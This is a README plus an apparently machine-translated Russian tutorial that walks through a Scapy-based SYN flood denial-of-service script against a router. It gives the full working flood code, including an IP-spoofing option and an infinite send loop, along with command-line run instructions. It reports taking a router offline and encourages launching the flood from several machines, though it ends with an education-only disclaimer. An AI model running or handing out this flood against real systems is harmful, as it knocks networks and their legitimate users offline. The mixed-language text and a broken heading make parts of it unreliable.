# [How to Make a SYN Flooding Attack in Python](https://www.thepythoncode.com/article/syn-flooding-attack-using-scapy-in-python)
To run this:
- `pip3 install -r requirements.txt`
- Run help:
    ```
    python syn_flood.py --help
    ```
    **Output:**
    ```
    usage: syn_flood.py [-h] [-p PORT] target_ip

    Simple SYN Flood Script

    positional arguments:
    target_ip             Target IP address (e.g router's IP)

    optional arguments:
    -h, --help            show this help message and exit
    -p PORT, --port PORT  Destination port (the port of the target's machine
                            service, e.g 80 for HTTP, 22 for SSH and so on).
    ```
- To run this against your router's web interface that has the IP address of 192.168.1.1:
    ```
    python syn_flood.py -p 80 192.168.1.1
    ```
##
# [[] / []]()
Syn-флуд-атака — это распространенная форма атаки типа «отказ в обслуживании», при которой злоумышленник отправляет последовательность SYN-запросов целевой системе (может быть маршрутизатором, брандмауэром, системами предотвращения вторжений (IPS) и т. Д.). для того, чтобы потреблять его ресурсы, не позволяя законным клиентам устанавливать регулярное соединение.

TCP SYN flood использует первую часть трехстороннего рукопожатия TCP, и поскольку каждое соединение, использующее протокол TCP, требует этого, эта атака оказывается опасной и может вывести из строя несколько сетевых компонентов.

Чтобы понять SYN-флуд, нам сначала нужно поговорить о трехстороннем рукопожатии TCP:

TCP Трехстороннее рукопожатиеКогда клиент хочет установить соединение с сервером по протоколу TCP, клиент и сервер обмениваются серией сообщений:

Клиент запрашивает соединение, отправляя syn-сообщение на сервер.
Сервер отвечает сообщением SYN-ACK (подтверждает запрос).
Клиент отвечает ACK, а затем подключение запускается.
Атака SYN flood включает в себя злоумышленника, который отправляет пакеты SYN неоднократно, не отвечая ACK, и часто с различными исходными портами, что делает сервер неосведомленным об атаке и отвечает на каждую попытку пакетом SYN-ACK с каждого порта (красная и зеленая часть приведенного выше изображения). Таким образом, сервер быстро перестанет отвечать на запросы законных клиентов.

Учебник по теме: Как создать прослушиватель DHCP с помощью Scapy в Python.

В этом учебнике будет реализована атака SYN-флуда с использованием библиотеки Scapy в Python. Чтобы начать работу, вам нужно установить Scapy:

pip3 install scapy
Откройте новый файл Python и импортируйте Scapy:

from scapy.all import *
Я собираюсь проверить это на моем локальном маршрутизаторе, который имеет частный IP-адрес 192.168.1.1:

# target IP address (should be a testing router/firewall)
target_ip = "192.168.1.1"
# the target port u want to flood
target_port = 80
Если вы хотите попробовать это на своем маршрутизаторе, убедитесь, что у вас есть правильный IP-адрес, вы можете получить адрес шлюза по умолчанию с помощью команд ipconfig и ip route в Windows и macOS / Linux соответственно.

Целевым портом является HTTP, так как я хочу наводнить веб-интерфейс моего маршрутизатора. Теперь давайте создадим наш пакет SYN, начиная с уровня IP:

# forge IP packet with target ip as the destination IP address
ip = IP(dst=target_ip)
# or if you want to perform IP Spoofing (will work as well)
# ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
Мы указали dst в качестве целевого IP-адреса, мы также можем установить src-адрес на поддельный случайный IP-адрес в диапазоне частной сети (закомментированный код), и он также будет работать.

Давайте создадим наш уровень TCP:

# forge a TCP SYN packet with a random source port
# and the target port as the destination port
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
Получите: Создайте 24 этических хакерских скрипта и инструмента с помощью Python Book

Таким образом, мы устанавливаем исходный порт (sport) на случайный короткий (который колеблется от 1 до 65535, как и порты) и dport (порт назначения) в качестве нашего целевого порта. В данном случае это служба HTTP.

Мы также устанавливаем флаги на "S", что указывает на тип SYN.

Теперь давайте добавим некоторые необработанные данные о флуде, чтобы занять сеть:

# add some flooding data (1KB in this case)
raw = Raw(b"X"*1024)
Удивительно, теперь давайте сложим слои и отправим пакет:

# stack up the layers
p = ip / tcp / raw
# send the constructed packet in a loop until CTRL+C is detected 
send(p, loop=1, verbose=0)
Поэтому мы использовали функцию send(), которая отправляет пакеты на уровне 3, мы установили цикл на 1, чтобы продолжать отправку, пока мы не нажмем CTRL + C, установив подробное значение 0, не будет печатать ничего во время процесса (без звука).

Сценарий готов! Теперь, после того, как я запустил это против своего маршрутизатора, это заняло несколько секунд, и, конечно же, маршрутизатор перестал работать, и я потерял соединение:

Маршрутизатор перестал работать после успешной атаки SYN-флуда с использованием ScapyЭто выходные данные следующей команды в Windows:

$ ping -t "192.168.1.1"
Он был захвачен с другой машины, отличной от злоумышленника, поэтому маршрутизатор больше не отвечает.

Чтобы вернуть все в нормальное русло, вы можете либо остановить атаку (нажав CTRL + C), либо, если устройство все еще не отвечает, продолжить и перезагрузить его.

Учебник по теме: Как сделать сканер сети с помощью Scapy в Python.

Заключение
Хорошо! С учебником покончено. Если вы попытаетесь запустить сценарий на локальном компьютере, вы заметите, что компьютер становится занятым, и задержка значительно увеличится. Вы также можете запустить сценарий на нескольких терминалах или даже на других машинах. Посмотрите, можете ли вы выключить сеть локального компьютера!

В нашей книге Ethical Hacking with Python мы создаем 24 хакерских инструмента с нуля с помощью Python. Обязательно проверьте это здесь, если вы заинтересованы!

Отказ от ответственности: Пожалуйста, не используйте его на устройстве, которым вы не владеете или не имеете разрешения. Мы не несем никакой ответственности. Этот учебник предназначен только для образовательных целей.

Узнайте также: Как создать ARP Spoofer в Python с помощью Scapy.